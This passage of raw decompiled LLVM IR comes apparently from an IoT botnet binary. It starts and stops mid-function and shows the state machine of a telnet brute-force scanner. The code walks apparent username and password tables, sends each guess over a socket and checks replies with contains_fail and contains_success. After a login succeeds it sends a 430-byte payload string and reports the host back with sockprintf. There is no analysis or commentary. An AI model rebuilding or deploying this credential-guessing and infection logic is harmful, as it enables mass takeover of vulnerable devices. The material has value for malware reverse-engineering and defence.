  %v0_e7d8 = load i32, i32* @r4, align 4
  store i32 %v1_e7d4, i32* @r2, align 4
  %v2_e7e4 = call i32 @__libc_fcntl(i32 %v0_e7d8, i32 4)
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v3_e808 = call i32 @advance_state(i32* nonnull %v1_e634, i32 2)
  br label %dec_label_pc_f254

dec_label_pc_e810:                                ; preds = %dec_label_pc_e61c
  store i32 %v5_e6f4, i32* %r3.global-to-local, align 4
  %v3_e814 = icmp eq i32 %v5_e6f4, -1
  br i1 %v3_e814, label %dec_label_pc_e81c, label %dec_label_pc_e840

dec_label_pc_e81c:                                ; preds = %dec_label_pc_e810
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v3_e838 = call i32 @reset_telstate(i32 %v2_e0e8, i32 %v3_df80, i32 %v3_e0dc)
  br label %dec_label_pc_f254

dec_label_pc_e840:                                ; preds = %dec_label_pc_e810
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  %v2_e85c = add i32 %v2_e0e4, %v2_e858
  store i32 %v2_e85c, i32* %r3.global-to-local, align 4
  %v1_e860 = inttoptr i32 %v2_e85c to i32*
  %v2_e860 = load i32, i32* %v1_e860, align 4
  store i32 %v2_e860, i32* %r3.global-to-local, align 4
  %v1_e864 = add i32 %v2_e860, 5
  store i32 %v1_e864, i32* @r4, align 4
  %v2_e86c = call i32 @__GI_time(i32* null)
  store i32 %v2_e86c, i32* %r3.global-to-local, align 4
  %v0_e874 = load i32, i32* @r4, align 4
  %v3_e874 = icmp ult i32 %v0_e874, %v2_e86c
  br i1 %v3_e874, label %dec_label_pc_e87c, label %dec_label_pc_f254

dec_label_pc_e87c:                                ; preds = %dec_label_pc_e840
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v3_e898 = call i32 @reset_telstate(i32 %v2_e0e8, i32 %v3_df80, i32 %v3_e0dc)
  br label %dec_label_pc_f254

dec_label_pc_e8a0:                                ; preds = %dec_label_pc_e134
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v1_e8b8 = inttoptr i32 %v2_e0e8 to i32*
  %v2_e8b8 = load i32, i32* %v1_e8b8, align 4
  store i32 %v2_e8b8, i32* %ip.global-to-local, align 4
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  %v2_e8d8 = add i32 %v2_e0e4, %v2_e8d4
  store i32 %v2_e8d8, i32* %r3.global-to-local, align 4
  %v1_e8dc = inttoptr i32 %v2_e8d8 to i32*
  %v2_e8dc = load i32, i32* %v1_e8dc, align 4
  store i32 %v2_e8dc, i32* %r2.global-to-local, align 4
  %v1_e8e4 = load i32, i32* @sp, align 4
  %v2_e8e4 = inttoptr i32 %v1_e8e4 to i32*
  store i32 ptrtoint (i32* @global_var_2646c to i32), i32* %v2_e8e4, align 4
  %v0_e8e8 = load i32, i32* %ip.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v4_e8f4 = inttoptr i32 %v2_e8dc to i8*
  %v5_e8f4 = call i32 @read_until_response(i32 %v0_e8e8, i32 %arg1, i8* %v4_e8f4, i32 512)
  %v2_e8fc = icmp eq i32 %v5_e8f4, 0
  store i32 %storemerge553, i32* %r3.global-to-local, align 4
  br i1 %v2_e8fc, label %dec_label_pc_e98c, label %dec_label_pc_e904

dec_label_pc_e904:                                ; preds = %dec_label_pc_e8a0
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  %v2_e920 = add i32 %v2_e0e8, 24
  store i32 %v2_e920, i32* %r3.global-to-local, align 4
  %v1_e924 = inttoptr i32 %v2_e920 to i32*
  %v2_e924 = load i32, i32* %v1_e924, align 4
  store i32 %v2_e924, i32* %r3.global-to-local, align 4
  %v1_e92c = call i32 @contains_fail(i32 %v2_e924)
  %v2_e934 = icmp eq i32 %v1_e92c, 0
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  br i1 %v2_e934, label %dec_label_pc_e964, label %dec_label_pc_e93c

dec_label_pc_e93c:                                ; preds = %dec_label_pc_e904
  %v3_e95c = call i32 @advance_state(i32* %v1_e8b8, i32 0)
  br label %dec_label_pc_f254

dec_label_pc_e964:                                ; preds = %dec_label_pc_e904
  %v3_e984 = call i32 @advance_state(i32* %v1_e8b8, i32 3)
  br label %dec_label_pc_f254

dec_label_pc_e98c:                                ; preds = %dec_label_pc_e8a0
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ec, i32* %r3.global-to-local, align 4
  %v2_e9ac = load i32, i32* %v1_e0f0, align 4
  store i32 %v2_e9ac, i32* %r3.global-to-local, align 4
  %v1_e9b0 = add i32 %v2_e9ac, 7
  store i32 %v1_e9b0, i32* @r4, align 4
  %v2_e9b8 = call i32 @__GI_time(i32* null)
  store i32 %v2_e9b8, i32* %r3.global-to-local, align 4
  %v0_e9c0 = load i32, i32* @r4, align 4
  %v3_e9c0 = icmp ult i32 %v0_e9c0, %v2_e9b8
  br i1 %v3_e9c0, label %dec_label_pc_e9c8, label %dec_label_pc_f254

dec_label_pc_e9c8:                                ; preds = %dec_label_pc_e98c
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v3_e9e4 = call i32 @reset_telstate(i32 %v2_e0e8, i32 %v3_df80, i32 %v3_e0dc)
  br label %dec_label_pc_f254

dec_label_pc_e9ec:                                ; preds = %dec_label_pc_e134
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v1_ea04 = inttoptr i32 %v2_e0e8 to i32*
  %v2_ea04 = load i32, i32* %v1_ea04, align 4
  store i32 %v2_ea04, i32* @r4, align 4
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  %v2_ea24 = add i32 %v2_e0e8, 8
  store i32 %v2_ea24, i32* %r3.global-to-local, align 4
  %v1_ea28 = add i32 %v2_e0e8, 10
  %v2_ea28 = inttoptr i32 %v1_ea28 to i8*
  %v3_ea28 = load i8, i8* %v2_ea28, align 2
  %v4_ea28 = zext i8 %v3_ea28 to i32
  store i32 %v4_ea28, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8*]* @global_var_26428.507 to i32), i32* %r3.global-to-local, align 4
  %v4_ea34 = mul nuw nsw i32 %v4_ea28, 4
  %v5_ea34 = add i32 %v4_ea34, ptrtoint ([6 x i8*]* @global_var_26428.507 to i32)
  %v6_ea34 = inttoptr i32 %v5_ea34 to i32*
  %v7_ea34 = load i32, i32* %v6_ea34, align 4
  store i32 %v7_ea34, i32* @r5, align 4
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_ea24, i32* %r3.global-to-local, align 4
  %v3_ea58 = load i8, i8* %v2_ea28, align 2
  %v4_ea58 = zext i8 %v3_ea58 to i32
  store i32 %v4_ea58, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8*]* @global_var_26428.507 to i32), i32* %r3.global-to-local, align 4
  %v4_ea64 = mul nuw nsw i32 %v4_ea58, 4
  %v5_ea64 = add i32 %v4_ea64, ptrtoint ([6 x i8*]* @global_var_26428.507 to i32)
  %v6_ea64 = inttoptr i32 %v5_ea64 to i32*
  %v7_ea64 = load i32, i32* %v6_ea64, align 4
  store i32 %v7_ea64, i32* %r3.global-to-local, align 4
  %v1_ea68 = inttoptr i32 %v7_ea64 to i8*
  %v3_ea6c = call i32 @strlen(i8* %v1_ea68)
  %v0_ea74 = load i32, i32* @r4, align 4
  %v0_ea78 = load i32, i32* @r5, align 4
  store i32 %v3_ea6c, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_ea84 = inttoptr i32 %v0_ea78 to i32*
  %v5_ea84 = call i32 @__libc_send(i32 %v0_ea74, i32* %v4_ea84, i32 %v3_ea6c, i32 16384)
  %v1_ea8c = icmp slt i32 %v5_ea84, 0
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  br i1 %v1_ea8c, label %dec_label_pc_ea94, label %dec_label_pc_eab8

dec_label_pc_ea94:                                ; preds = %dec_label_pc_e9ec
  %v3_eab0 = call i32 @reset_telstate(i32 %v2_e0e8, i32 %v3_df80, i32 %v3_e0dc)
  br label %dec_label_pc_f254

dec_label_pc_eab8:                                ; preds = %dec_label_pc_e9ec
  %v2_ead0 = load i32, i32* %v1_ea04, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_eae4 = call i32 @__libc_send(i32 %v2_ead0, i32* bitcast ([3 x i8]* @global_var_1c328.509 to i32*), i32 2, i32 16384)
  %v1_eaec = icmp slt i32 %v6_eae4, 0
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  br i1 %v1_eaec, label %dec_label_pc_eaf4, label %dec_label_pc_eb18

dec_label_pc_eaf4:                                ; preds = %dec_label_pc_eab8
  %v3_eb10 = call i32 @reset_telstate(i32 %v2_e0e8, i32 %v3_df80, i32 %v3_e0dc)
  br label %dec_label_pc_f254

dec_label_pc_eb18:                                ; preds = %dec_label_pc_eab8
  %v3_eb38 = call i32 @advance_state(i32* nonnull %v1_ea04, i32 4)
  br label %dec_label_pc_f254

dec_label_pc_eb40:                                ; preds = %dec_label_pc_e134
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v1_eb58 = inttoptr i32 %v2_e0e8 to i32*
  %v2_eb58 = load i32, i32* %v1_eb58, align 4
  store i32 %v2_eb58, i32* %ip.global-to-local, align 4
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  %v2_eb78 = add i32 %v2_e0e4, %v2_e8d4
  store i32 %v2_eb78, i32* %r3.global-to-local, align 4
  %v1_eb7c = inttoptr i32 %v2_eb78 to i32*
  %v2_eb7c = load i32, i32* %v1_eb7c, align 4
  store i32 %v2_eb7c, i32* %r2.global-to-local, align 4
  %v1_eb84 = load i32, i32* @sp, align 4
  %v2_eb84 = inttoptr i32 %v1_eb84 to i32*
  store i32 ptrtoint (i32* @global_var_2646c to i32), i32* %v2_eb84, align 4
  %v0_eb88 = load i32, i32* %ip.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v4_eb94 = inttoptr i32 %v2_eb7c to i8*
  %v5_eb94 = call i32 @read_until_response(i32 %v0_eb88, i32 %arg1, i8* %v4_eb94, i32 512)
  %v2_eb9c = icmp eq i32 %v5_eb94, 0
  store i32 %storemerge553, i32* %r3.global-to-local, align 4
  br i1 %v2_eb9c, label %dec_label_pc_ec2c, label %dec_label_pc_eba4

dec_label_pc_eba4:                                ; preds = %dec_label_pc_eb40
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  %v2_ebc0 = add i32 %v2_e0e8, 24
  store i32 %v2_ebc0, i32* %r3.global-to-local, align 4
  %v1_ebc4 = inttoptr i32 %v2_ebc0 to i32*
  %v2_ebc4 = load i32, i32* %v1_ebc4, align 4
  store i32 %v2_ebc4, i32* %r3.global-to-local, align 4
  %v1_ebcc = call i32 @contains_fail(i32 %v2_ebc4)
  %v2_ebd4 = icmp eq i32 %v1_ebcc, 0
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  br i1 %v2_ebd4, label %dec_label_pc_ec04, label %dec_label_pc_ebdc

dec_label_pc_ebdc:                                ; preds = %dec_label_pc_eba4
  %v3_ebfc = call i32 @advance_state(i32* %v1_eb58, i32 0)
  br label %dec_label_pc_f254

dec_label_pc_ec04:                                ; preds = %dec_label_pc_eba4
  %v3_ec24 = call i32 @advance_state(i32* %v1_eb58, i32 5)
  br label %dec_label_pc_f254

dec_label_pc_ec2c:                                ; preds = %dec_label_pc_eb40
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ec, i32* %r3.global-to-local, align 4
  %v2_ec4c = load i32, i32* %v1_e0f0, align 4
  store i32 %v2_ec4c, i32* %r3.global-to-local, align 4
  %v1_ec50 = add i32 %v2_ec4c, 3
  store i32 %v1_ec50, i32* @r4, align 4
  %v2_ec58 = call i32 @__GI_time(i32* null)
  store i32 %v2_ec58, i32* %r3.global-to-local, align 4
  %v0_ec60 = load i32, i32* @r4, align 4
  %v3_ec60 = icmp ult i32 %v0_ec60, %v2_ec58
  br i1 %v3_ec60, label %dec_label_pc_ec68, label %dec_label_pc_f254

dec_label_pc_ec68:                                ; preds = %dec_label_pc_ec2c
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v3_ec84 = call i32 @reset_telstate(i32 %v2_e0e8, i32 %v3_df80, i32 %v3_e0dc)
  br label %dec_label_pc_f254

dec_label_pc_ec8c:                                ; preds = %dec_label_pc_e134
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v1_eca4 = inttoptr i32 %v2_e0e8 to i32*
  %v2_eca4 = load i32, i32* %v1_eca4, align 4
  store i32 %v2_eca4, i32* @r4, align 4
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  %v2_ecc4 = add i32 %v2_e0e8, 8
  store i32 %v2_ecc4, i32* %r3.global-to-local, align 4
  %v1_ecc8 = add i32 %v2_e0e8, 11
  %v2_ecc8 = inttoptr i32 %v1_ecc8 to i8*
  %v3_ecc8 = load i8, i8* %v2_ecc8, align 1
  %v4_ecc8 = zext i8 %v3_ecc8 to i32
  store i32 %v4_ecc8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8*]* @global_var_26434.511 to i32), i32* %r3.global-to-local, align 4
  %v4_ecd4 = mul nuw nsw i32 %v4_ecc8, 4
  %v5_ecd4 = add i32 %v4_ecd4, ptrtoint ([3 x i8*]* @global_var_26434.511 to i32)
  %v6_ecd4 = inttoptr i32 %v5_ecd4 to i32*
  %v7_ecd4 = load i32, i32* %v6_ecd4, align 4
  store i32 %v7_ecd4, i32* @r5, align 4
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_ecc4, i32* %r3.global-to-local, align 4
  %v3_ecf8 = load i8, i8* %v2_ecc8, align 1
  %v4_ecf8 = zext i8 %v3_ecf8 to i32
  store i32 %v4_ecf8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8*]* @global_var_26434.511 to i32), i32* %r3.global-to-local, align 4
  %v4_ed04 = mul nuw nsw i32 %v4_ecf8, 4
  %v5_ed04 = add i32 %v4_ed04, ptrtoint ([3 x i8*]* @global_var_26434.511 to i32)
  %v6_ed04 = inttoptr i32 %v5_ed04 to i32*
  %v7_ed04 = load i32, i32* %v6_ed04, align 4
  store i32 %v7_ed04, i32* %r3.global-to-local, align 4
  %v1_ed08 = inttoptr i32 %v7_ed04 to i8*
  %v3_ed0c = call i32 @strlen(i8* %v1_ed08)
  %v0_ed14 = load i32, i32* @r4, align 4
  %v0_ed18 = load i32, i32* @r5, align 4
  store i32 %v3_ed0c, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_ed24 = inttoptr i32 %v0_ed18 to i32*
  %v5_ed24 = call i32 @__libc_send(i32 %v0_ed14, i32* %v4_ed24, i32 %v3_ed0c, i32 16384)
  %v1_ed2c = icmp slt i32 %v5_ed24, 0
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  br i1 %v1_ed2c, label %dec_label_pc_ed34, label %dec_label_pc_ed58

dec_label_pc_ed34:                                ; preds = %dec_label_pc_ec8c
  %v3_ed50 = call i32 @reset_telstate(i32 %v2_e0e8, i32 %v3_df80, i32 %v3_e0dc)
  br label %dec_label_pc_f254

dec_label_pc_ed58:                                ; preds = %dec_label_pc_ec8c
  %v2_ed70 = load i32, i32* %v1_eca4, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_ed84 = call i32 @__libc_send(i32 %v2_ed70, i32* bitcast ([3 x i8]* @global_var_1c328.509 to i32*), i32 2, i32 16384)
  %v1_ed8c = icmp slt i32 %v6_ed84, 0
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  br i1 %v1_ed8c, label %dec_label_pc_ed94, label %dec_label_pc_edb8

dec_label_pc_ed94:                                ; preds = %dec_label_pc_ed58
  %v3_edb0 = call i32 @reset_telstate(i32 %v2_e0e8, i32 %v3_df80, i32 %v3_e0dc)
  br label %dec_label_pc_f254

dec_label_pc_edb8:                                ; preds = %dec_label_pc_ed58
  %v3_edd8 = call i32 @advance_state(i32* nonnull %v1_eca4, i32 6)
  br label %dec_label_pc_f254

dec_label_pc_ede0:                                ; preds = %dec_label_pc_e134
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v1_edf8 = inttoptr i32 %v2_e0e8 to i32*
  %v2_edf8 = load i32, i32* %v1_edf8, align 4
  store i32 %v2_edf8, i32* %ip.global-to-local, align 4
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  %v2_ee18 = add i32 %v2_e0e4, %v2_e8d4
  store i32 %v2_ee18, i32* %r3.global-to-local, align 4
  %v1_ee1c = inttoptr i32 %v2_ee18 to i32*
  %v2_ee1c = load i32, i32* %v1_ee1c, align 4
  store i32 %v2_ee1c, i32* %r2.global-to-local, align 4
  %v1_ee24 = load i32, i32* @sp, align 4
  %v2_ee24 = inttoptr i32 %v1_ee24 to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_264b0.513 to i32), i32* %v2_ee24, align 4
  %v0_ee28 = load i32, i32* %ip.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v4_ee34 = inttoptr i32 %v2_ee1c to i8*
  %v5_ee34 = call i32 @read_until_response(i32 %v0_ee28, i32 %arg1, i8* %v4_ee34, i32 512)
  store i32 %v5_ee34, i32* %r3.global-to-local, align 4
  %v2_ee3c = icmp eq i32 %v5_ee34, 0
  br i1 %v2_ee3c, label %dec_label_pc_f084, label %dec_label_pc_ee44

dec_label_pc_ee44:                                ; preds = %dec_label_pc_ede0
  store i32 %storemerge553, i32* @r4, align 4
  %v2_ee4c = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_ee60 = load i32, i32* @r4, align 4
  %v2_ee6c = mul i32 %v0_ee60, 28
  %v2_ee74 = add i32 %v2_e858, %v2_ee6c
  %v2_ee78 = inttoptr i32 %v2_ee74 to i32*
  store i32 %v2_ee4c, i32* %v2_ee78, align 4
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_ee18, i32* %r3.global-to-local, align 4
  %v2_ee9c = load i32, i32* %v1_ee1c, align 4
  store i32 %v2_ee9c, i32* %r3.global-to-local, align 4
  %v1_eea4 = call i32 @contains_fail(i32 %v2_ee9c)
  store i32 %v1_eea4, i32* %r3.global-to-local, align 4
  %v2_eeac = icmp eq i32 %v1_eea4, 0
  br i1 %v2_eeac, label %dec_label_pc_eedc, label %dec_label_pc_eeb4

dec_label_pc_eeb4:                                ; preds = %dec_label_pc_ee44
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v3_eed4 = call i32 @advance_state(i32* %v1_edf8, i32 0)
  br label %dec_label_pc_f254

dec_label_pc_eedc:                                ; preds = %dec_label_pc_ee44
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_ee18, i32* %r3.global-to-local, align 4
  %v2_eefc = load i32, i32* %v1_ee1c, align 4
  store i32 %v2_eefc, i32* %r3.global-to-local, align 4
  %v1_ef04 = call i32 @contains_success(i32 %v2_eefc)
  store i32 %v1_ef04, i32* %r3.global-to-local, align 4
  %v2_ef0c = icmp eq i32 %v1_ef04, 0
  br i1 %v2_ef0c, label %dec_label_pc_f034, label %dec_label_pc_ef14

dec_label_pc_ef14:                                ; preds = %dec_label_pc_eedc
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  %v2_ef30 = add i32 %v2_e0e8, 8
  store i32 %v2_ef30, i32* %r3.global-to-local, align 4
  %v1_ef34 = add i32 %v2_e0e8, 9
  %v2_ef34 = inttoptr i32 %v1_ef34 to i8*
  %v3_ef34 = load i8, i8* %v2_ef34, align 1
  %v4_ef34 = zext i8 %v3_ef34 to i32
  store i32 %v4_ef34, i32* %r3.global-to-local, align 4
  %v7_ef38 = icmp eq i8 %v3_ef34, 2
  br i1 %v7_ef38, label %dec_label_pc_ef40, label %dec_label_pc_ef68

dec_label_pc_ef40:                                ; preds = %dec_label_pc_ef14
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v3_ef60 = call i32 @advance_state(i32* %v1_edf8, i32 7)
  br label %dec_label_pc_f254

dec_label_pc_ef68:                                ; preds = %dec_label_pc_ef14
  %v2_ef6c = load i32, i32* @global_var_26864.54, align 4
  store i32 %v2_ef6c, i32* @r4, align 4
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v3_ef8c = call i32 @get_telstate_host(i32 %v2_e0e8, i32 %v3_df80, i32 %v3_e0dc)
  store i32 %v3_ef8c, i32* %ip.global-to-local, align 4
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_ef30, i32* %r3.global-to-local, align 4
  %v1_efb4 = add i32 %v2_e0e8, 10
  %v2_efb4 = inttoptr i32 %v1_efb4 to i8*
  %v3_efb4 = load i8, i8* %v2_efb4, align 2
  %v4_efb4 = zext i8 %v3_efb4 to i32
  store i32 %v4_efb4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8*]* @global_var_26428.507 to i32), i32* %r3.global-to-local, align 4
  %v4_efc0 = mul nuw nsw i32 %v4_efb4, 4
  %v5_efc0 = add i32 %v4_efc0, ptrtoint ([6 x i8*]* @global_var_26428.507 to i32)
  %v6_efc0 = inttoptr i32 %v5_efc0 to i32*
  %v7_efc0 = load i32, i32* %v6_efc0, align 4
  store i32 %v7_efc0, i32* @lr, align 4
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_ef30, i32* %r3.global-to-local, align 4
  %v1_efe4 = add i32 %v2_e0e8, 11
  %v2_efe4 = inttoptr i32 %v1_efe4 to i8*
  %v3_efe4 = load i8, i8* %v2_efe4, align 1
  %v4_efe4 = zext i8 %v3_efe4 to i32
  store i32 %v4_efe4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8*]* @global_var_26434.511 to i32), i32* %r3.global-to-local, align 4
  %v4_eff0 = mul nuw nsw i32 %v4_efe4, 4
  %v5_eff0 = add i32 %v4_eff0, ptrtoint ([3 x i8*]* @global_var_26434.511 to i32)
  %v6_eff0 = inttoptr i32 %v5_eff0 to i32*
  %v7_eff0 = load i32, i32* %v6_eff0, align 4
  %v1_eff4 = load i32, i32* @sp, align 4
  %v2_eff4 = inttoptr i32 %v1_eff4 to i32*
  store i32 %v7_eff0, i32* %v2_eff4, align 4
  %v0_eff8 = load i32, i32* @r4, align 4
  %v0_f000 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_f000, i32* @r2, align 4
  %v0_f004 = load i32, i32* @lr, align 4
  store i32 %v0_f004, i32* %r3.global-to-local, align 4
  %v3_f008 = call i32 @sockprintf(i32 %v0_eff8, i32 ptrtoint ([23 x i8]* @global_var_1c32c.516 to i32))
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v3_f02c = call i32 @advance_state(i32* %v1_edf8, i32 7)
  br label %dec_label_pc_f254

dec_label_pc_f034:                                ; preds = %dec_label_pc_eedc
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v3_f050 = call i32 @reset_telstate(i32 %v2_e0e8, i32 %v3_df80, i32 %v3_e0dc)
  br label %dec_label_pc_f254

dec_label_pc_f084:                                ; preds = %dec_label_pc_ede0
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  %v2_f0a0 = add i32 %v2_e0e4, %v2_e858
  store i32 %v2_f0a0, i32* %r3.global-to-local, align 4
  %v1_f0a4 = inttoptr i32 %v2_f0a0 to i32*
  %v2_f0a4 = load i32, i32* %v1_f0a4, align 4
  store i32 %v2_f0a4, i32* %r3.global-to-local, align 4
  %v1_f0a8 = add i32 %v2_f0a4, 7
  store i32 %v1_f0a8, i32* @r4, align 4
  %v2_f0b0 = call i32 @__GI_time(i32* null)
  store i32 %v2_f0b0, i32* %r3.global-to-local, align 4
  %v0_f0b8 = load i32, i32* @r4, align 4
  %v3_f0b8 = icmp ult i32 %v0_f0b8, %v2_f0b0
  br i1 %v3_f0b8, label %dec_label_pc_f0c0, label %dec_label_pc_f254

dec_label_pc_f0c0:                                ; preds = %dec_label_pc_f084
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v3_f0dc = call i32 @reset_telstate(i32 %v2_e0e8, i32 %v3_df80, i32 %v3_e0dc)
  br label %dec_label_pc_f254

dec_label_pc_f0e4:                                ; preds = %dec_label_pc_e134
  store i32 %storemerge553, i32* @r4, align 4
  %v2_f0ec = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_f100 = load i32, i32* @r4, align 4
  %v2_f10c = mul i32 %v0_f100, 28
  %v2_f114 = add i32 %v2_e858, %v2_f10c
  %v2_f118 = inttoptr i32 %v2_f114 to i32*
  store i32 %v2_f0ec, i32* %v2_f118, align 4
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v1_f134 = inttoptr i32 %v2_e0e8 to i32*
  %v2_f134 = load i32, i32* %v1_f134, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_f148 = call i32 @__libc_send(i32 %v2_f134, i32* bitcast ([5 x i8]* @global_var_1c344.518 to i32*), i32 4, i32 16384)
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v2_f164 = load i32, i32* %v1_f134, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_f178 = call i32 @__libc_send(i32 %v2_f164, i32* bitcast ([8 x i8]* @global_var_1c34c.520 to i32*), i32 7, i32 16384)
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v2_f194 = load i32, i32* %v1_f134, align 4
  store i32 %v2_f194, i32* @r4, align 4
  %v2_f19c = load i32, i32* bitcast ([430 x i8]** @global_var_26424.523 to i32*), align 4
  store i32 %v2_f19c, i32* @r5, align 4
  store i32 %v2_f19c, i32* %r3.global-to-local, align 4
  %v1_f1a8 = inttoptr i32 %v2_f19c to i8*
  %v3_f1ac = call i32 @strlen(i8* %v1_f1a8)
  %v0_f1b4 = load i32, i32* @r4, align 4
  %v0_f1b8 = load i32, i32* @r5, align 4
  store i32 %v3_f1ac, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %tmp44 = inttoptr i32 %v0_f1b8 to i32*
  %v6_f1c4 = call i32 @__libc_send(i32 %v0_f1b4, i32* %tmp44, i32 %v3_f1ac, i32 16384)
  store i32 %v6_f1c4, i32* %r3.global-to-local, align 4
  %v1_f1cc = icmp slt i32 %v6_f1c4, 0
  br i1 %v1_f1cc, label %dec_label_pc_f1d4, label %dec_label_pc_f1f8

dec_label_pc_f1d4:                                ; preds = %dec_label_pc_f0e4
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e8, i32* %r3.global-to-local, align 4
  %v3_f1f0 = call i32 @reset_telstate(i32 %v2_e0e8, i32 %v3_df80, i32 %v3_e0dc)
  br label %dec_label_pc_f254

dec_label_pc_f1f8:                                ; preds = %dec_label_pc_f0e4
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
  %v2_f214 = add i32 %v2_e0e4, %v2_e858
  store i32 %v2_f214, i32* %r3.global-to-local, align 4
  %v1_f218 = inttoptr i32 %v2_f214 to i32*
  %v2_f218 = load i32, i32* %v1_f218, align 4
  store i32 %v2_f218, i32* %r3.global-to-local, align 4
  %v1_f21c = add i32 %v2_f218, 25
  store i32 %v1_f21c, i32* @r4, align 4
  %v2_f224 = call i32 @__GI_time(i32* null)
  store i32 %v2_f224, i32* %r3.global-to-local, align 4
  %v0_f22c = load i32, i32* @r4, align 4
  %v3_f22c = icmp ult i32 %v0_f22c, %v2_f224
  br i1 %v3_f22c, label %dec_label_pc_f234, label %dec_label_pc_f254

dec_label_pc_f234:                                ; preds = %dec_label_pc_f1f8
  store i32 %v3_e0dc, i32* %r2.global-to-local, align 4
